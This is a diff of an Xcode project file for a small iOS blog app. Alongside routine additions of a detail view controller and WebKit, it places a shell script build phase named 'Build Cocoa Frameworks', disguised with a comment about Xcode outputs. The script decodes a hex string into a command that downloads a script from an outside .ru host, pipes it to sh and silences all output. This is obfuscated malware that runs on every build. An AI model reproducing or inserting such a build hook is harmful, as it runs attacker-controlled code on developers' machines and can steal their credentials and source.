@@ -10,6 +10,8 @@
 		9A5A4B502834887500FF7E0E /* BlogViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9A5A4B4E2834887500FF7E0E /* BlogViewController.m */; };
 		9A5A4B542834899300FF7E0E /* BlogTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9A5A4B532834899300FF7E0E /* BlogTableViewCell.m */; };
 		9A5A4B5728348C4100FF7E0E /* BlogPost.m in Sources */ = {isa = PBXBuildFile; fileRef = 9A5A4B5628348C4100FF7E0E /* BlogPost.m */; };
+		9A5A4B602834AA6E00FF7E0E /* BlogDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9A5A4B5F2834AA6E00FF7E0E /* BlogDetailViewController.m */; };
+		9A5A4B632834ACD000FF7E0E /* WebKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9A5A4B622834ACD000FF7E0E /* WebKit.framework */; };
 		9AD43FD828342DC80065B82A /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 9AD43FD728342DC80065B82A /* AppDelegate.m */; };
 		9AD43FDB28342DC80065B82A /* SceneDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 9AD43FDA28342DC80065B82A /* SceneDelegate.m */; };
 		9AD43FDE28342DC80065B82A /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9AD43FDD28342DC80065B82A /* ViewController.m */; };
@@ -46,6 +48,9 @@
 		9A5A4B532834899300FF7E0E /* BlogTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BlogTableViewCell.m; sourceTree = "<group>"; };
 		9A5A4B5528348C4100FF7E0E /* BlogPost.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BlogPost.h; sourceTree = "<group>"; };
 		9A5A4B5628348C4100FF7E0E /* BlogPost.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BlogPost.m; sourceTree = "<group>"; };
+		9A5A4B5E2834AA6E00FF7E0E /* BlogDetailViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BlogDetailViewController.h; sourceTree = "<group>"; };
+		9A5A4B5F2834AA6E00FF7E0E /* BlogDetailViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BlogDetailViewController.m; sourceTree = "<group>"; };
+		9A5A4B622834ACD000FF7E0E /* WebKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebKit.framework; path = System/Library/Frameworks/WebKit.framework; sourceTree = SDKROOT; };
 		9AD43FD328342DC80065B82A /* TestBlogProject.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TestBlogProject.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		9AD43FD628342DC80065B82A /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		9AD43FD728342DC80065B82A /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
@@ -70,6 +75,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9A5A4B632834ACD000FF7E0E /* WebKit.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -111,6 +117,7 @@
 		9A5A4B5A2834907000FF7E0E /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				9A5A4B5D2834AA5800FF7E0E /* Detail */,
 				9A5A4B5B2834907B00FF7E0E /* Onboarding */,
 				9A5A4B5C2834908B00FF7E0E /* Blog */,
 			);
@@ -135,6 +142,23 @@
 			path = Blog;
 			sourceTree = "<group>";
 		};
+		9A5A4B5D2834AA5800FF7E0E /* Detail */ = {
+			isa = PBXGroup;
+			children = (
+				9A5A4B5E2834AA6E00FF7E0E /* BlogDetailViewController.h */,
+				9A5A4B5F2834AA6E00FF7E0E /* BlogDetailViewController.m */,
+			);
+			path = Detail;
+			sourceTree = "<group>";
+		};
+		9A5A4B612834ACD000FF7E0E /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				9A5A4B622834ACD000FF7E0E /* WebKit.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		9AD43FCA28342DC80065B82A = {
 			isa = PBXGroup;
 			children = (
@@ -142,6 +166,7 @@
 				9AD43FF128342DC90065B82A /* TestBlogProjectTests */,
 				9AD43FFB28342DC90065B82A /* TestBlogProjectUITests */,
 				9AD43FD428342DC80065B82A /* Products */,
+				9A5A4B612834ACD000FF7E0E /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -317,6 +342,27 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		CB33748C0927A0F6216A102C /* Build Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f\n6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		9AD43FCF28342DC80065B82A /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -325,6 +371,7 @@
 				9A5A4B5728348C4100FF7E0E /* BlogPost.m in Sources */,
 				9AD43FDE28342DC80065B82A /* ViewController.m in Sources */,
 				9AD43FD828342DC80065B82A /* AppDelegate.m in Sources */,
+				9A5A4B602834AA6E00FF7E0E /* BlogDetailViewController.m in Sources */,
 				9A5A4B502834887500FF7E0E /* BlogViewController.m in Sources */,
 				9A5A4B542834899300FF7E0E /* BlogTableViewCell.m in Sources */,
 				9AD43FE928342DC90065B82A /* main.m in Sources */,
@@ -650,35 +697,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-		
-	CB33748C0927A0F6216A102C /* Build Cocoa Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Cocoa Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = 9AD43FCB28342DC80065B82A /* Project object */;
 }
